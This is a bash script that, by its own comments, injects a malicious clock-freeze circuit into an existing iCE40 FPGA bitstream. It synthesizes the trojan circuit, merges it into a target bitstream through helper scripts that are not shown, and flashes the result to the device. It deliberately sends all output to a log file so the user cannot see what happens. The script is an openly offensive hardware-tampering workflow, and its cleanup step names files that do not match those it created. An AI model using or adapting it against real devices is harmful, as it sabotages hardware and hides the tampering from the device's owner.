#/bin/bash
#malicious file for injecting a clock freeze circuit into a bitstream
#keep overwriting the log.txt file so the user cannot see any output.
yosys -p "synth_ice40 -top drive1toclock -json blinky.json" freezeclock.v > log.txt
nextpnr-ice40 --json blinky.json --asc freezeclock.asc --pcf freezeclock.pcf --up5k --package sg48 > log.txt
icepack freezeclock.asc freezeclock.bin > log.txt

#take the bin files and unpack them into asc
iceunpack freezeclock.bin circuit1.asc > log.txt
iceunpack $1 circuit2.asc > log.txt

#extract the data from the asc files and store them in a json
python extractAsc.py circuit1.asc circuit1.json > log.txt
python extractAsc.py circuit2.asc circuit2.json > log.txt

#now process the json files and update them
python processingascdata.py circuit1.json circuit1_processed.json > log.txt
python processingascdata.py circuit2.json circuit2_processed.json > log.txt
rm circuit1.json 
rm circuit2.json

#now try to combine the two json descriptions
python combine_circuits.py circuit1_processed.json circuit2_processed.json combined_circuit.json > log.txt
rm circuit_1_processed.json
rm circuit_2_processed.json

#use the json file to create a new asc file
python json2asc.py combined_circuit.json combined_circuit.asc > log.txt
rm combined_circuit.json

#pack and program
icepack combined_circuit.asc combined_circuit.bin > log.txt
iceprog combined_circuit.bin